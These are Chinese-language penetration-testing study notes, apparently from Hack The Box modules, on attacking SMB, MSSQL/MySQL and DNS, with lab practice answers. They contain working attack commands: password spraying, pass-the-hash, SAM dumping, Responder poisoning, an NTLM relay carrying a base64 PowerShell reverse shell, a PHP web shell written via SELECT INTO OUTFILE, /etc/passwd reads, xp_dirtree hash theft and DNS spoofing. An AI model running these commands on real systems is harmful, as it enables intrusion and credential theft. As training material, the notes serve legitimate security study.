<h4 id="Remote-Procedure-Call-RPC"><a href="#Remote-Procedure-Call-RPC" class="headerlink" title="Remote Procedure Call (RPC)"></a>Remote Procedure Call (RPC)</h4><p>我们可以使用带有空会话的rpcclient工具来枚举工作站或域控制器。 rpcclient工具为我们提供了许多不同的命令，用于在SMB服务器上执行特定功能，以收集信息或修改服务器属性（如用户名）。我们可以使用SANS研究所的这份备忘单，也可以查看客户端手册页上所有这些功能的完整列表。</p>
<pre><code class="shell-session">Tanin@htb[/htb]$ rpcclient -U&#39;%&#39; 10.10.110.17

rpcclient $&gt; enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
</code></pre>
<p>Brute Forcing和密码喷雾 当暴力强制时，我们会对一个帐户尝试尽可能多的密码，但如果我们达到阈值，它会锁定一个帐户。我们可以使用暴力，如果我们知道的话，可以在达到阈值之前停止。否则，我们不建议使用暴力。 密码喷洒是一个更好的选择，因为我们可以用一个通用密码锁定用户名列表，以避免帐户锁定。如果我们知道帐户锁定阈值，我们可以尝试多个密码。通常，两到三次尝试是安全的，只要我们在两次尝试之间等待30-60分钟。让我们探索一下<a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> 工具，它包括执行密码喷涂的功能。 使用CrackMapExec（CME），我们可以针对多个IP，使用大量用户和密码。让我们来探索一个密码喷涂的日常使用案例。要对一个IP执行密码喷洒，我们可以使用选项-u指定带有用户列表的文件，使用选项-p指定密码。这将尝试使用提供的密码对列表中的每个用户进行身份验证。</p>
<pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p &#39;Company01!&#39; --local-auth

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 
</code></pre>
<blockquote>
<p>注意：默认情况下，CME将在成功登录后退出。使用–continue-on-success标志将继续喷洒，即使在找到有效密码后也是如此。它对于向大型用户列表喷洒单个密码非常有用。此外，如果我们的目标是一台未加入域的计算机，我们将需要使用选项–local-auth。有关更详细的研究密码喷洒，请参阅Active Directory枚举和攻击模块。</p>
</blockquote>
<h4 id="Remote-Code-Execution-RCE"><a href="#Remote-Code-Execution-RCE" class="headerlink" title="Remote Code Execution (RCE)"></a>Remote Code Execution (RCE)</h4><h4 id="Impacket-PsExec"><a href="#Impacket-PsExec" class="headerlink" title="Impacket PsExec"></a>Impacket PsExec</h4><pre><code class="shell-session">Tanin@htb[/htb]$ impacket-psexec administrator:&#39;Password123!&#39;@10.10.110.17
</code></pre>
<h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><p>我们可以用来运行CMD或PowerShell的另一个工具是CrackMapExec。CrackMapExec的一个优点是可以一次在多个主机上运行命令。要使用它，我们需要指定协议、smb、IP地址或IP地址范围，选项-u表示用户名，-p表示密码，选项-x用于运行cmd命令，大写-x用于运行PowerShell命令。</p>
<pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p &#39;Password123!&#39; -x &#39;whoami&#39; --exec-method smbexec

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
SMB         10.10.110.17 445    WIN7BOX  nt authority\system
</code></pre>
<blockquote>
<p>注意：如果没有定义–exec方法，CrackMapExec将尝试执行atexec方法，如果失败，您可以尝试指定–exec方式smbexec。</p>
</blockquote>
<h4 id="Enumerating-Logged-on-Users"><a href="#Enumerating-Logged-on-Users" class="headerlink" title="Enumerating Logged-on Users"></a>Enumerating Logged-on Users</h4><p>想象一下，我们在一个有多台机器的网络中。其中一些共享相同的本地管理员帐户。在这种情况下，我们可以使用CrackMapExec枚举同一网络中所有机器上的登录用户10.10.110.17&#x2F;24，这加快了我们的枚举过程。</p>
<pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p &#39;Password123!&#39; --loggedon-users
</code></pre>
<h4 id="Extract-Hashes-from-SAM-Database"><a href="#Extract-Hashes-from-SAM-Database" class="headerlink" title="Extract Hashes from SAM Database"></a>Extract Hashes from SAM Database</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p &#39;Password123!&#39; --sam
</code></pre>
<h4 id="Pass-the-Hash-PtH"><a href="#Pass-the-Hash-PtH" class="headerlink" title="Pass-the-Hash (PtH)"></a>Pass-the-Hash (PtH)</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
</code></pre>
<h4 id="Forced-Authentication-Attacks"><a href="#Forced-Authentication-Attacks" class="headerlink" title="Forced Authentication Attacks"></a>Forced Authentication Attacks</h4><p>我们还可以通过创建假SMB服务器来捕获用户的NetNTLM v1&#x2F;v2哈希，从而滥用SMB协议。 执行此类操作的最常见工具是Responder。Responder是一种LLMNR、NBT-NS和MDNS投毒器工具，具有不同的功能，其中之一是可以设置虚假服务，包括SMB，以窃取NetNTLM v1&#x2F;v2哈希。在其默认配置中，它将查找LLMNR和NBT-NS流量。然后，它将代表受害者正在寻找的服务器进行响应，并捕获他们的NetNTLM哈希。 让我们举例说明Responder是如何工作的。想象一下，我们使用响应程序默认配置创建了一个假的SMB服务器，并使用以下命令：</p>
<pre><code class="shell-session">Tanin@htb[/htb]$ responder -I &lt;interface name&gt;
</code></pre>
<p>假设用户错误地键入了共享文件夹的名称\mysharefoder\，而不是\mysharedfolder\。在这种情况下，所有名称解析都将失败，因为名称不存在，并且机器将向网络上的所有设备发送多播查询，包括我们运行的假冒SMB服务器。这是一个问题，因为没有采取任何措施来验证答复的完整性。攻击者可以通过监听此类查询和欺骗响应来利用这一机制，使受害者相信恶意服务器是可信的。这种信任通常用于窃取凭据。</p>
<pre><code class="shell-session">Tanin@htb[/htb]$ sudo responder -I ens33

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              

           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0
               
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:                
    LLMNR                      [ON]
    NBT-NS                     [ON]        
    DNS/MDNS                   [ON]   
                                                                                                                                                                                          
[+] Servers:         
    HTTP server                [ON]                                   
    HTTPS server               [ON]
    WPAD proxy                 [OFF]                                  
    Auth proxy                 [OFF]
    SMB server                 [ON]                                   
    Kerberos server            [ON]                                   
    SQL server                 [ON]                                   
    FTP server                 [ON]                                   
    IMAP server                [ON]                                   
    POP3 server                [ON]                                   
    SMTP server                [ON]                                   
    DNS server                 [ON]                                   
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]                                   
                                                                                   
[+] HTTP Options:                                                                  
    Always serving EXE         [OFF]                                               
    Serving EXE                [OFF]                                               
    Serving HTML               [OFF]                                               
    Upstream Proxy             [OFF]                                               

[+] Poisoning Options:                                                             
    Analyze Mode               [OFF]                                               
    Force WPAD auth            [OFF]                                               
    Force Basic Auth           [OFF]                                               
    Force LM downgrade         [OFF]                                               
    Fingerprint hosts          [OFF]                                               

[+] Generic Options:                                                               
    Responder NIC              [tun0]                                              
    Responder IP               [10.10.14.198]                                      
    Challenge set              [random]                                            
    Don&#39;t Respond To Names     [&#39;ISATAP&#39;]                                          

[+] Current Session Variables:                                                     
    Responder Machine Name     [WIN-2TY1Z1CIGXH]   
    Responder Domain Name      [HF2L.LOCAL]                                        
    Responder DCE-RPC Port     [48162] 

[+] Listening for events... 

[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
</code></pre>
<p>已破解NTLMv2哈希。密码是P@ssword.如果我们无法破解哈希，我们可以使用impacket ntlmrelayx或Responder MultiRelay.py将捕获的哈希中继到另一台机器。让我们看看使用impacket-ntlmrelay的示例。</p>
<p>首先，我们需要在响应程序配置文件（&#x2F;etc&#x2F;responser&#x2F;responder.conf）中将SMB设置为OFF。</p>
<pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/responder/Responder.conf | grep &#39;SMB =&#39;

SMB = Off
</code></pre>
<p>然后，我们使用选项–no http server、-sb2support执行impacket-ntlmrelayx，并使用选项-t执行目标机器。默认情况下，impacket-ntlmrelayx将转储SAM数据库，但我们可以通过添加选项-c来执行命令。</p>
<p>我们可以使用创建PowerShell反向shell<a target="_blank" rel="noopener" href="https://www.revshells.com/%EF%BC%8C%E8%AE%BE%E7%BD%AE%E6%88%91%E4%BB%AC%E7%9A%84%E6%9C%BA%E5%99%A8IP%E5%9C%B0%E5%9D%80%E3%80%81%E7%AB%AF%E5%8F%A3%E5%92%8C%E9%80%89%E9%A1%B9Powershell#3%EF%BC%88Base64%EF%BC%89%E3%80%82">https://www.revshells.com/，设置我们的机器IP地址、端口和选项Powershell#3（Base64）。</a></p>
<pre><code class="shell-session">Tanin@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c &#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#39;
</code></pre>
<h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><blockquote>
<p>具有读取权限的共享文件夹的名称是什么？</p>
<p>用户名“jason”的密码是什么？</p>
<p>通过SSH以用户“jason”身份登录并找到标志.txt文件。提交内容作为您的答案。</p>
</blockquote>
<p>使用smbmap：</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111559845.png" alt="image-20230811155958797"></p>
<p>根据给出的用户名爆破一下密码：</p>
<pre><code>crackmapexec smb 10.129.203.6 -u jason -p passwords.list --local-auth 
</code></pre>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111612302.png" alt="image-20230811161236259"></p>
<p>这里使用ssh链接但是失败了，尝试使用rce</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111624866.png" alt="image-20230811162433821"></p>
<p>impact没有写权限，无语</p>
<h1 id="Attacking-SQL-Databases"><a href="#Attacking-SQL-Databases" class="headerlink" title="Attacking SQL Databases"></a>Attacking SQL Databases</h1><p>默认情况下，MSSQL使用端口TCP&#x2F;1433和UDP&#x2F;1434，MySQL使用TCP&#x2F;3306。但是，当MSSQL在“隐藏”模式下运行时，它使用TCP&#x2F;2433端口。我们可以使用Nmap的默认脚本-sC选项来枚举目标系统上的数据库服务</p>
<h4 id="MySQL-Connecting-to-the-SQL-Server"><a href="#MySQL-Connecting-to-the-SQL-Server" class="headerlink" title="MySQL - Connecting to the SQL Server"></a>MySQL - Connecting to the SQL Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
</code></pre>
<h4 id="Sqlcmd-Connecting-to-the-SQL-Server"><a href="#Sqlcmd-Connecting-to-the-SQL-Server" class="headerlink" title="Sqlcmd - Connecting to the SQL Server"></a>Sqlcmd - Connecting to the SQL Server</h4><pre><code class="cmd-session">C:\htb&gt; sqlcmd -S SRVMSSQL -U julio -P &#39;MyPassword!&#39; -y 30 -Y 30
</code></pre>
<p>注意：当我们使用sqlcmd向MSSQL进行身份验证时，我们可以使用参数-y（SQLCMDMAXVARTYPEWIDTH）和-y（SQLCMDMAXFIXEDTYPEWIDTH）来获得更好的输出。请记住，这可能会影响性能。</p>
<p>如果我们的目标是来自Linux的MSSQL，我们可以使用sqsh作为sqlcmd的替代方案：</p>
<pre><code class="shell-session">Tanin@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P &#39;MyPassword!&#39; -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type &#39;\warranty&#39;
1&gt;
</code></pre>
<p>或者，我们可以使用Impacket中名为mssqlclient.py的工具。</p>
<pre><code class="shell-session">Tanin@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 
</code></pre>
<h2 id="Execute-Commands"><a href="#Execute-Commands" class="headerlink" title="Execute Commands"></a>Execute Commands</h2><p>在攻击公共服务时，命令执行是最需要的功能之一，因为它允许我们控制操作系统。如果我们有适当的权限，我们可以使用SQL数据库执行系统命令或创建必要的元素来执行。</p>
<p>MSSQL有一个名为xp_cmdshell的扩展存储过程，它允许我们使用SQL执行系统命令。请记住以下关于xp_cmdshell的内容： xpcmdshell是一个强大的功能，默认情况下是禁用的。xp_cmdshell可以通过使用基于策略的管理或执行sp_configure来启用和禁用 xp_cmdshell派生的Windows进程与SQL Server服务帐户具有相同的安全权限 xp_cmdshell同步运行。在命令shell命令完成之前，控件不会返回给调用方 要在MSSQL上使用SQL语法执行命令，请使用：</p>
<pre><code class="cmd-session">1&gt; xp_cmdshell &#39;whoami&#39;
2&gt; GO
</code></pre>
<p>如果没有启用xp_cmdshell，如果我们有适当的权限，我们可以使用以下命令启用它：</p>
<pre><code class="mssql">-- To allow advanced options to be changed.  
EXECUTE sp_configure &#39;show advanced options&#39;, 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure &#39;xp_cmdshell&#39;, 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
</code></pre>
<p>MySQL支持用户定义函数，这允许我们在SQL中作为函数执行C&#x2F;C++代码，在这个GitHub存储库 <a target="_blank" rel="noopener" href="https://github.com/mysqludf/lib_mysqludf_sys">GitHub repository</a>中有一个用于命令执行的用户定义函数。在生产环境中遇到这样的用户定义函数并不常见，但我们应该意识到，我们可能能够使用它</p>
<h2 id="Write-Local-Files"><a href="#Write-Local-Files" class="headerlink" title="Write Local Files"></a>Write Local Files</h2><p>如果我们有适当的权限，我们可以尝试在web服务器目录中使用SELECT INTO OUTFILE编写文件。然后我们可以浏览到文件所在的位置并执行我们的命令。</p>
<pre><code class="shell-session">mysql&gt; SELECT &quot;&lt;?php echo shell_exec($_GET[&#39;c&#39;]);?&gt;&quot; INTO OUTFILE &#39;/var/www/html/webshell.php&#39;;

Query OK, 1 row affected (0.001 sec)
</code></pre>
<p>在MySQL中，全局系统变量secure_file_priv限制了数据导入和导出操作的效果，例如由LOAD data和SELECT…INTO OUTFILE语句以及LOAD_file（）函数执行的操作。这些操作只允许具有FILE权限的用户执行。</p>
<pre><code class="shell-session">mysql&gt; show variables like &quot;secure_file_priv&quot;;

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
</code></pre>
<p>如果secure_file_priv变量为空，这意味着我们可以使用MySQL读取和写入数据</p>
<h4 id="MySQL-Read-Local-Files-in-MySQL"><a href="#MySQL-Read-Local-Files-in-MySQL" class="headerlink" title="MySQL - Read Local Files in MySQL"></a>MySQL - Read Local Files in MySQL</h4><pre><code class="shell-session">mysql&gt; select LOAD_FILE(&quot;/etc/passwd&quot;);
</code></pre>
<h2 id="Capture-MSSQL-Service-Hash"><a href="#Capture-MSSQL-Service-Hash" class="headerlink" title="Capture MSSQL Service Hash"></a>Capture MSSQL Service Hash</h2><p>在攻击SMB部分，我们讨论了我们可以创建一个假的SMB服务器来窃取哈希并在Windows操作系统中滥用一些默认实现。我们还可以使用xp_subdirs或xp_dirtree未记录的存储过程窃取MSSQL服务帐户哈希，这些存储过程使用SMB协议从文件系统中检索指定父目录下的子目录列表。当我们使用其中一个存储过程并将其指向SMB服务器时，目录侦听功能将强制服务器进行身份验证并发送运行SQL server的服务帐户的NTLMv2哈希。 为了实现这一点，我们需要首先启动Responder或impacket-smbserver，并执行以下SQL查询之一：</p>
<h4 id="XP-DIRTREE-Hash-Stealing"><a href="#XP-DIRTREE-Hash-Stealing" class="headerlink" title="XP_DIRTREE Hash Stealing"></a>XP_DIRTREE Hash Stealing</h4><pre><code class="cmd-session">1&gt; EXEC master..xp_dirtree &#39;\\10.10.110.17\share\&#39;
2&gt; GO
</code></pre>
<h4 id="XP-SUBDIRS-Hash-Stealing"><a href="#XP-SUBDIRS-Hash-Stealing" class="headerlink" title="XP_SUBDIRS Hash Stealing"></a>XP_SUBDIRS Hash Stealing</h4><pre><code class="cmd-session">1&gt; EXEC master..xp_subdirs &#39;\\10.10.110.17\share\&#39;
2&gt; GO
</code></pre>
<h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><blockquote>
<p>What is the password for the “mssqlsvc” user?</p>
</blockquote>
<p>这里尝试了用给到的字典进行爆破，发现不可行，反复阅读文案后发现可以导出hash：</p>
<p>先监听</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308122043562.png" alt="image-20230812204234008"></p>
<p>然后执行查询语句弹回hash</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308161515067.png" alt="image-20230812204400386"></p>
<p>然后破解hash即可</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308122050713.png" alt="image-20230812205036653"></p>
<h1 id="Attacking-DNS"><a href="#Attacking-DNS" class="headerlink" title="Attacking DNS"></a>Attacking DNS</h1><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><pre><code class="shell-session">Tanin@htb[/htb]# nmap -p53 -Pn -sV -sC 10.10.110.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 03:47 EDT
Nmap scan report for 10.10.110.213
Host is up (0.017s latency).

PORT    STATE  SERVICE     VERSION
53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
</code></pre>
<p>DNS区域是特定组织或管理员管理的DNS命名空间的一部分。由于DNS包括多个DNS区域，DNS服务器利用DNS区域传输将其数据库的一部分复制到另一个DNS服务器。除非DNS服务器配置正确（限制哪些IP可以执行DNS区域传输），否则任何人都可以向DNS服务器索取其区域信息的副本，因为DNS区域传输不需要任何身份验证。此外，DNS服务通常在UDP端口上运行；然而，在执行DNS区域传输时，它使用TCP端口进行可靠的数据传输。 攻击者可以利用此DNS区域传输漏洞来了解有关目标组织的DNS命名空间的更多信息，从而增加攻击面。为了利用此漏洞，我们可以使用带有DNS查询类型AXFR选项的dig实用程序从易受攻击的DNS服务器中转储整个DNS命名空间：</p>
<pre><code class="shell-session">Tanin@htb[/htb]# dig AXFR @ns1.inlanefreight.htb inlanefreight.htb

; &lt;&lt;&gt;&gt; DiG 9.11.5-P1-1-Debian &lt;&lt;&gt;&gt; axfr inlanefrieght.htb @10.129.110.213
;; global options: +cmd
inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
inlanefrieght.htb.         604800  IN      AAAA    ::1
inlanefrieght.htb.         604800  IN      NS      localhost.
inlanefrieght.htb.         604800  IN      A       10.129.110.22
admin.inlanefrieght.htb.   604800  IN      A       10.129.110.21
hr.inlanefrieght.htb.      604800  IN      A       10.129.110.25
support.inlanefrieght.htb. 604800  IN      A       10.129.110.28
inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 28 msec
;; SERVER: 10.129.110.213#53(10.129.110.213)
;; WHEN: Mon Oct 11 17:20:13 EDT 2020
;; XFR size: 8 records (messages 1, bytes 289)
</code></pre>
<p>像 <a target="_blank" rel="noopener" href="https://github.com/mschwager/fierce">Fierce</a>这样的工具也可以用来枚举根域的所有DNS服务器，并扫描DNS区域传输：</p>
<pre><code class="shell-session">Tanin@htb[/htb]# fierce --domain zonetransfer.me
</code></pre>
<h2 id="Domain-Takeovers-amp-Subdomain-Enumeration"><a href="#Domain-Takeovers-amp-Subdomain-Enumeration" class="headerlink" title="Domain Takeovers &amp; Subdomain Enumeration"></a>Domain Takeovers &amp; Subdomain Enumeration</h2><p>在执行子域接管之前，我们应该使用<a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/subfinder">Subfinder</a>等工具枚举目标域的子域。这个工具可以从像 <a target="_blank" rel="noopener" href="https://dnsdumpster.com/">DNSdumpster</a>这样的开放源代码中抓取子域。<a target="_blank" rel="noopener" href="https://github.com/aboul3la/Sublist3r">Sublist3r</a>等其他工具也可以通过提供预先生成的单词列表来使用暴力子域：</p>
<pre><code class="shell-session">Tanin@htb[/htb]# ./subfinder -d inlanefreight.com -v       
                                                                       
        _     __ _         _                                           
____  _| |__ / _(_)_ _  __| |___ _ _          
(_-&lt; || | &#39;_ \  _| | &#39; \/ _  / -_) &#39;_|                 
/__/\_,_|_.__/_| |_|_||_\__,_\___|_| v2.4.5                                                                                                                                                                                                                                                 
                projectdiscovery.io                    
                                                                       
[WRN] Use with caution. You are responsible for your actions
[WRN] Developers assume no liability and are not responsible for any misuse or damage.
[WRN] By using subfinder, you also agree to the terms of the APIs used. 
                                   
[INF] Enumerating subdomains for inlanefreight.com
[alienvault] www.inlanefreight.com
[dnsdumpster] ns1.inlanefreight.com
[dnsdumpster] ns2.inlanefreight.com
...snip...
[bufferover] Source took 2.193235338s for enumeration
ns2.inlanefreight.com
www.inlanefreight.com
ns1.inlanefreight.com
support.inlanefreight.com
[INF] Found 4 subdomains for inlanefreight.com in 20 seconds 11 milliseconds
</code></pre>
<p>一个很好的替代方案是一种名为<a target="_blank" rel="noopener" href="https://github.com/TheRook/subbrute">Subbrute</a>的工具。该工具允许我们使用自定义解析器，并在无法访问Internet的主机上进行内部渗透测试时执行纯DNS暴力攻击。</p>
<pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git &gt;&gt; /dev/null 2&gt;&amp;1
Tanin@htb[/htb]$ cd subbrute
Tanin@htb[/htb]$ echo &quot;ns1.inlanefreight.com&quot; &gt; ./resolvers.txt
Tanin@htb[/htb]$ ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt
</code></pre>
<p>有时内部物理配置的安全性很差，我们可以利用它从U盘上传工具。另一种情况是，我们已经通过转向到达了一个内部主机，并希望在那里工作。当然，还有其他选择，但知道其他方式和可能性并没有坏处。 该工具发现了四个与inlanefreight.com相关的子域。使用nslookup或host命令，我们可以枚举这些子域的CNAME记录。</p>
<pre><code class="shell-session">Tanin@htb[/htb]# host support.inlanefreight.com

support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
</code></pre>
<p>支持子域有一个指向AWS S3存储桶的别名记录。但是，URL<a target="_blank" rel="noopener" href="https://support.inlanefreight.com显示了一个nosuchbucket错误,表明子域可能容易受到子域接管的攻击.现在,我们可以通过创建一个具有相同子域名称的aws/">https://support.inlanefreight.com显示了一个NoSuchBucket错误，表明子域可能容易受到子域接管的攻击。现在，我们可以通过创建一个具有相同子域名称的AWS</a> S3 bucket来接管子域。</p>
<p> <a target="_blank" rel="noopener" href="https://github.com/EdOverflow/can-i-take-over-xyz">can-i-take-over-xyz</a>存储库也是子域接管漏洞的绝佳参考。它显示了目标服务是否易受子域接管的攻击，并提供了评估漏洞的指导方针。</p>
<h4 id="Local-DNS-Cache-Poisoning"><a href="#Local-DNS-Cache-Poisoning" class="headerlink" title="Local DNS Cache Poisoning"></a>Local DNS Cache Poisoning</h4><p>从本地网络的角度来看，攻击者还可以使用 <a target="_blank" rel="noopener" href="https://www.ettercap-project.org/">Ettercap</a> 或<a target="_blank" rel="noopener" href="https://www.bettercap.org/">Bettercap</a>等MITM工具执行DNS缓存中毒。 要通过Ettercap利用DNS缓存中毒，我们应该首先编辑&#x2F;etc&#x2F;Ettercap&#x2F;etter.DNS文件，以映射他们想要欺骗的目标域名（例如，inlanefreight.com）和他们想要将用户重定向到的攻击者的IP地址（例如，192.168.225.110）：</p>
<pre><code class="shell-session">Tanin@htb[/htb]# cat /etc/ettercap/etter.dns

inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110
</code></pre>
<p>接下来，启动Ettercap工具，并通过导航到主机&gt;扫描主机来扫描网络中的活动主机。完成后，将目标IP地址（例如192.168.152.129）添加到Target1，并将默认网关IP（例如192.168.152.2）添加到Target2。</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308131743246.png" alt="img"></p>
<p>通过导航到插件&gt;管理插件来激活dns_恶搞攻击。这将向目标计算机发送假DNS响应，该响应将解析inlanefreight.com到IP地址192.168.225.110：</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308131743982.png" alt="img"></p>
<p>成功的DNS欺骗攻击后，如果来自目标机器192.168.152.129的受害者用户在web浏览器上访问inlanefreight.com域，他们将被重定向到IP地址192.168.225.110上的虚假页面，此外，从目标IP地址192.168.152.129到inlanefreight.com的ping也应解析为192.168.225.110：</p>
<h2 id="practice-3"><a href="#practice-3" class="headerlink" title="practice"></a>practice</h2><blockquote>
<p>Find all available DNS records for the “inlanefreight.htb” domain on the target name server and submit the flag found as a DNS record as the answer.</p>
</blockquote>
